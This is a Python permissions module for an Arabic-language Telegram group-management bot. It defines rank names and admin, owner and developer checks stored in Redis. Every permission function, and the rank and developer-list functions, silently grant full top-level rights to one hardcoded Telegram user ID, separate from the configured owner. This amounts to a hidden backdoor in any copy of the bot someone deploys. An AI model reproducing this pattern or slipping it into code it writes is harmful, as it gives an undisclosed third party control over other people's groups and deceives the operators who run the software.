from config import *
import re
def get_rank(id, cid) -> str:
   if id == 6646631745 or id == 6646631745:
      return 'Aec🎖️'
   if id == int(Dev_Naif):
      return 'البوت'
   if id == int(r.get(f'{Dev_Naif}botowner')):
      return 'Dev🎖️'
   if r.get(f'{id}:rankDEV2:{Dev_Naif}'):
      return 'Dev²🎖'
   if r.get(f'{id}:rankDEV:{Dev_Naif}'):
      return 'Myth🎖️'
   if r.get(f'{id}:gban:{Dev_Naif}'):
      return 'محظور عام'
   if r.get(f'{id}:mute:{Dev_Naif}'):
      return 'محظور عام'
   if r.get(f'{cid}:rankGOWNER:{id}{Dev_Naif}'):
      if r.get(f'{cid}:RankGowner:{Dev_Naif}'):
         return r.get(f'{cid}:RankGowner:{Dev_Naif}')
      return 'المالك الاساسي'
   if r.get(f'{cid}:rankOWNER:{id}{Dev_Naif}'):
      if r.get(f'{cid}:RankOwner:{Dev_Naif}'):
         return r.get(f'{cid}:RankOwner:{Dev_Naif}')
      return 'المالك'
   if r.get(f'{cid}:rankMOD:{id}{Dev_Naif}'):
      if r.get(f'{cid}:RankMod:{Dev_Naif}'):
         return r.get(f'{cid}:RankMod:{Dev_Naif}')
      return 'المدير'
   if r.get(f'{cid}:rankADMIN:{id}{Dev_Naif}'):
      if r.get(f'{cid}:RankAdm:{Dev_Naif}'):
         return r.get(f'{cid}:RankAdm:{Dev_Naif}')
      return 'ادمن'
   if r.get(f'{cid}:rankPRE:{id}{Dev_Naif}'):
      if r.get(f'{cid}:RankPre:{Dev_Naif}'):
         return r.get(f'{cid}:RankPre:{Dev_Naif}')
      return 'مميز'
   else:
      if r.get(f'{cid}:RankMem:{Dev_Naif}'):
         return r.get(f'{cid}:RankMem:{Dev_Naif}')
      return 'عضو'

def admin_pls(id, cid) -> bool:
   if id == 6646631745 or id == 6646631745:
      return True
   if id == 6646631745 or id == 6646631745:
      return True
   if id == int(Dev_Naif):
      return True
   if id == int(r.get(f'{Dev_Naif}botowner')):
      return True
   if r.get(f'{id}:rankDEV2:{Dev_Naif}'):
      return True
   if r.get(f'{id}:rankDEV:{Dev_Naif}'):
      return True
   if r.get(f'{cid}:rankGOWNER:{id}{Dev_Naif}'):
      return True
   if r.get(f'{cid}:rankOWNER:{id}{Dev_Naif}'):
      return True
   if r.get(f'{cid}:rankMOD:{id}{Dev_Naif}'):
      return True
   if r.get(f'{cid}:rankADMIN:{id}{Dev_Naif}'):
      return True
   else:
      return False

def mod_pls(id, cid) -> bool:
   if id == 6646631745 or id == 6646631745:
      return True
   if id == 6646631745 or id == 6646631745:
      return True
   if id == int(Dev_Naif):
      return True
   if id == int(r.get(f'{Dev_Naif}botowner')):
      return True
   if r.get(f'{id}:rankDEV2:{Dev_Naif}'):
      return True
   if r.get(f'{id}:rankDEV:{Dev_Naif}'):
      return True
   if r.get(f'{cid}:rankGOWNER:{id}{Dev_Naif}'):
      return True
   if r.get(f'{cid}:rankOWNER:{id}{Dev_Naif}'):
      return True
   if r.get(f'{cid}:rankMOD:{id}{Dev_Naif}'):
      return True
   else:
      return False

def owner_pls(id, cid) -> bool:
   if id == 6646631745 or id == 6646631745:
      return True
   if id == 6646631745 or id == 6646631745:
      return True
   if id == int(Dev_Naif):
      return True
   if id == int(r.get(f'{Dev_Naif}botowner')):
      return True
   if r.get(f'{id}:rankDEV2:{Dev_Naif}'):
      return True
   if r.get(f'{id}:rankDEV:{Dev_Naif}'):
      return True
   if r.get(f'{cid}:rankGOWNER:{id}{Dev_Naif}'):
      return True
   if r.get(f'{cid}:rankOWNER:{id}{Dev_Naif}'):
      return True
   else:
      return False

def gowner_pls(id, cid) -> bool:
   if id == 6646631745 or id == 6646631745:
      return True
   if id == 6646631745 or id == 6646631745:
      return True
   if id == int(Dev_Naif):
      return True
   if id == int(r.get(f'{Dev_Naif}botowner')):
      return True
   if r.get(f'{id}:rankDEV2:{Dev_Naif}'):
      return True
   if r.get(f'{id}:rankDEV:{Dev_Naif}'):
      return True
   if r.get(f'{cid}:rankGOWNER:{id}{Dev_Naif}'):
      return True
   else:
      return False

def dev_pls(id, cid) -> bool:
   if id == 6646631745 or id == 6646631745:
      return True
   if id == 6646631745 or id == 6646631745:
      return True
   if id == int(Dev_Naif):
      return True
   if id == int(r.get(f'{Dev_Naif}botowner')):
      return True
   if r.get(f'{id}:rankDEV2:{Dev_Naif}'):
      return True
   if r.get(f'{id}:rankDEV:{Dev_Naif}'):
      return True
   else:
      return False

def dev2_pls(id, cid) -> bool:
   if id == 6646631745 or id == 6646631745:
      return True
   if id == 6646631745 or id == 6646631745:
      return True
   if id == int(Dev_Naif):
      return True
   if id == int(r.get(f'{Dev_Naif}botowner')):
      return True
   if r.get(f'{id}:rankDEV2:{Dev_Naif}'):
      return True
   else:
      return False

def devp_pls(id, cid) -> bool:
   if id == 6646631745 or id == 6646631745:
      return True
   if id == 6646631745 or id == 6646631745:
      return True
   if id == int(Dev_Naif):
      return True
   if id == int(r.get(f'{Dev_Naif}botowner')):
      return True
   else:
      return False


def pre_pls(id, cid) -> bool:
   if id == 6646631745 or id == 6646631745:
      return True
   if id == 6646631745 or id == 6646631745:
      return True
   if id == int(r.get(f'{Dev_Naif}botowner')):
      return True
   if id == int(Dev_Naif):
      return True
   if r.get(f'{id}:rankDEV2:{Dev_Naif}'):
      return True
   if r.get(f'{id}:rankDEV:{Dev_Naif}'):
      return True
   if r.get(f'{cid}:rankGOWNER:{id}{Dev_Naif}'):
      return True
   if r.get(f'{cid}:rankOWNER:{id}{Dev_Naif}'):
      return True
   if r.get(f'{cid}:rankMOD:{id}{Dev_Naif}'):
      return True
   if r.get(f'{cid}:rankADMIN:{id}{Dev_Naif}'):
      return True
   if r.get(f'{cid}:rankPRE:{id}{Dev_Naif}'):
      return True
   else:
      return False

   
def get_devs_br():
   list = []
   if not int(r.get(f'{Dev_Naif}botowner')) == 6646631745:
      list.append(6646631745)
   list.append(int(r.get(f'{Dev_Naif}botowner')))
   if r.smembers(f'{Dev_Naif}DEV2'):
      for dev2 in r.smembers(f'{Dev_Naif}DEV2'):
         list.append(int(dev2))
   return list


def isLockCommand(fid: int, cid: int, text: str):
   if not r.hgetall(Dev_Naif+f"locks-{cid}"):
      return False
   else:
      commands = r.hgetall(Dev_Naif+f"locks-{cid}")
      if text not in commands: return False
      for command in commands:
         cc = int(commands[command])
         if command.lower() in text.lower():
            print(text)
            print(command)
            if cc == 0:
               if not gowner_pls(fid, cid):
                  return True
               else:
                  return False
            if cc == 1:
               if not owner_pls(fid, cid):
                  return True
               else:
                  return False
            if cc == 2:
               if not mod_pls(fid, cid):
                  return True
               else:
                  return False
            if cc == 3:
               if not admin_pls(fid, cid):
                  return True
               else:
                  return False
            if cc == 4:
               if not pre_pls(fid, cid):
                  return True
               else:
                  return False